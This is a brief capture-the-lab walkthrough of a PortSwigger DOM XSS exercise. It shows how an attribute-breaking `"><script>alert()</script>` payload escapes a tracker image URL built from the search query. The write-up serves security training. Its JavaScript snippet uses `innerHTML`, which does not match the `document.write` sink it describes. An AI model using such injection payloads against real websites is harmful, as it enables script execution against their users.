# DOM XSS in `document.write` sink using source `location.search`

## This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

## To solve this lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function.

```javascript
var search = document.getElementById("search").value;
var results = document.getElementById("results");
results.innerHTML = "You searched for: " + search;
```

---

### step 1

search something on search box for eg. search test
inspect the page
`<img src="/resources/images/tracker.gif?searchTerms=test" d3x1pocsd="">`
`add <script>alert()</script>`
`<img src="/resources/images/tracker.gif?searchTerms=<script>alert()</script>" u4lljo1cx="">`

### step2

now use
`"><script>alert()</script>`
so it will be
`<img src="/resources/images/tracker.gif?searchTerms="> <script>alert()</script> u4lljo1cx="">`
